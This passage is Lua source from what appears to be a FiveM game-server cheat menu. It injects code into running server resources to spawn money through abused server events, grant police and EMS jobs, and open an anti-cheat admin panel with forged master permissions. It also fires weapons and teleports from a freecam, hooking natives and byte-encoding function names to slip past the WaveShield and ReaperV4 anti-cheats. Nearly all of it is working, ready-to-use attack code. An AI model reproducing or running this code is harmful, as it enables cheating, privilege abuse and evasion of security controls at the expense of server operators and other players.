                MachoInjectResource2(NewThreadNs, "tm-base", [[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]])
            end
        })
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Set Chat Tag",
            onSelect = function()
                qd8:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                local tagName = GetInput("Chat Tag Name", "")
                if not tagName or tagName == "" then
                    qd8:ShowUI()
                    return
                end

                Wait(500)

                local colorInput = GetInput("Tag Color (R, G, B)", "0, 255, 0")
                if not colorInput or colorInput == "" then
                    colorInput = "255, 255, 255"
                end

                Wait(500)

                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                MachoInjectResourceRaw(targetResource, string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]], tagName, colorInput))

                qd8:ShowUI()
            end
        })
    end

if GetResourceState("wasabi_multijob") == 'started' then
    AddTrigger({ type = "button", label = "Set Job #3 (Police)",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]])
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]])
        end
    })
end

if GetResourceState("wasabi_multijob") == 'started' then
    AddTrigger({ type = "button", label = "Set Job #2 (EMS)",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]])
        MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]])
        end
    })
end


if GetResourceState("ElectronAC") == 'started' then
    AddTrigger({ type = "button", label = "ElectronAC Admin Panel",
        onSelect = function()
        MachoInjectResourceRaw("ElectronAC", [[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]])
        end
    })
end

if GetResourceState("spoodyFraud") == 'started' then
    AddTrigger({ type = "button", label = "Give Money #1",
        onSelect = function()
        MachoInjectResource2(NewThreadNs, 'spoodyFraud', [[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]])
        end
    })
end

    KeyboardInput("Choose Menu Key", "", function(val)
        for vk, name in pairs(MappedKeys) do
            if name:lower() == val:lower() then
                MenuKey = name
                Wait(250)
                qd8:ShowUI()
                return
            end
        end
    end, "keybind")

    local lastSliderPress = 0
    local sliderDelay = 120

    while true do
        Wait(0)

        if FreecamEnabled then
            local hoveredOption = FreecamOptions[FreecamHoveredIndex]

            -- Scroll Wheel
            if IsControlJustReleased(0, 14) then -- Wheel Down
                FreecamHoveredIndex = (FreecamHoveredIndex % #FreecamOptions) + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "down" }))
            end

            if IsControlJustReleased(0, 15) then -- Wheel Up
                FreecamHoveredIndex = (FreecamHoveredIndex - 2) % #FreecamOptions + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "up" }))
            end

            if hoveredOption == "Shoot Weapon" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentWeaponIndex = (CurrentWeaponIndex - 2) % #FreecamWeaponList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentWeaponIndex = (CurrentWeaponIndex % #FreecamWeaponList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
            elseif hoveredOption == "Spawn Car" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentVehicleIndex = (CurrentVehicleIndex - 2) % #FreecamVehicleList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentVehicleIndex = (CurrentVehicleIndex % #FreecamVehicleList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
            end

            if IsDisabledControlPressed(0, 24) then
                local action = hoveredOption
                if action == "Shoot Weapon" then
                    local weapon = FreecamWeaponList[CurrentWeaponIndex]

                    if weapon == "WEAPON_PERMKILL" then
                        weapon = "WEAPON_TRANQUILIZER"
                    elseif weapon == "WEAPON_RPG_2" then
                        weapon = "WEAPON_AIRSTRIKE_ROCKET"
                    end

                    if weapon ~= LastWeaponFired then
                        LastWeaponFired = weapon

                        print(("weapon: %s, LastWeaponFired: %s"):format(weapon, LastWeaponFired))
                        
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.qd8FreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                    local camRot = GetCamRot(_G.qd8FreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
                                        if not _G.qd8WeaponBypass then
                                            _G.qd8WeaponBypass = { enabled = false }
                                        end
                                        _G.qd8WeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.qd8WeaponBypass and _G.qd8WeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.qd8WeaponBypass and _G.qd8WeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]], playerPed, weaponBytes))

                                    -- MachoInjectThread(0, GetResourceState("monitor") and "monitor" or "any", "", [[
                                    --     function hNative(nativeName, newFunction)
                                    --         local originalNative = _G[nativeName]
                                    --         if not originalNative or type(originalNative) ~= "function" then
                                    --             return
                                    --         end

                                    --         _G[nativeName] = function(...)
                                    --             return newFunction(originalNative, ...)
                                    --         end
                                    --     end

                                    --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    --     hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    --     local camCoords = ]] .. camCoords .. [[
                                    --     local targetPos = ]] .. targetPos .. [[
                                    --     local weaponHash = GetHashKey(]] .. weapon .. [[)

                                    --     GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                    --     SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                    -- ]])

                                    Wait(350)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        PlayerPedId(),
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                    if _G.qd8FreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                        local camRot = GetCamRot(_G.qd8FreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]] .. weapon .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]])
                            end
                        else
                            if _G.qd8FreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                local camRot = GetCamRot(_G.qd8FreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(playerPed, weaponHash, 255, false, true)
                                MachoInjectThread(0, "ReaperV4", "", [[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]] .. weaponHash .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]])
                                Wait(250)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100,           -- damage
                                    true,          -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true,          -- isInvisible
                                    false,         -- isCritical
                                    100000.0         -- speed
                                )
                            end
                        end
                    else
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.qd8FreecamObject then
                                    print("Toogie Doogie")

                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                    local camRot = GetCamRot(_G.qd8FreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
                                        if not _G.qd8WeaponBypass then
                                            _G.qd8WeaponBypass = { enabled = false }
                                        end
                                        _G.qd8WeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.qd8WeaponBypass and _G.qd8WeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.qd8WeaponBypass and _G.qd8WeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]], playerPed, weaponBytes))

                                    Wait(150)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        playerPed,
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                    if _G.qd8FreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                        local camRot = GetCamRot(_G.qd8FreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]] .. weapon .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]])
                            end
                        else
                            if _G.qd8FreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                local camRot = GetCamRot(_G.qd8FreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100,           -- damage
                                    true,          -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true,          -- isInvisible
                                    false,         -- isCritical
                                    100000.0         -- speed
                                )
                            end
                        end
                    end
                end
            end

            -- Left Click
            if IsDisabledControlJustPressed(0, 24) then
                local action = hoveredOption
                if action == "Teleport" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        if GetResourceState("WaveShield") == "started" then
                            if _G.qd8FreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function GetEmptyt(vehicle)
                                    local seats = {
                                        -1, 0, 1, 2
                                    }

                                    for _, seat in ipairs(seats) do
                                        if IsVehicleSeatFree(vehicle, seat) then
                                            return seat
                                        end
                                    end

                                    return -1
                                end

                                local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                local rot = GetCamRot(_G.qd8FreecamObject, 2)
                                local forward = RotationToDirection(rot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit
                                        local playerPed = PlayerPedId()
                                        local seat = GetEmptySeat(vehicle)
                                        if seat == -1 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                        elseif seat >= 0 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                        else
                                            print("[^5SYNC^7]: There aren't any seats available in this vehicle.")
                                        end
                                    else
                                        SetEntityCoords(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                    end
                                else
                                    print("[^5SYNC^7]: There aren't any valid locations to teleport to.")
                                end
                            end
                        else
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                if _G.qd8FreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.qd8FreecamObject)
                                    local rot = GetCamRot(_G.qd8FreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5qd8^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5qd8^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]])
                        end
                    else
                        if _G.qd8FreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = {
                                    -1, 0, 1, 2
                                }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local camCoords = GetCamCoord(_G.qd8FreecamObject)
                            local rot = GetCamRot(_G.qd8FreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0

                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit
                                    local playerPed = PlayerPedId()
                                    local seat = GetEmptySeat(vehicle)
                                    if seat == -1 then
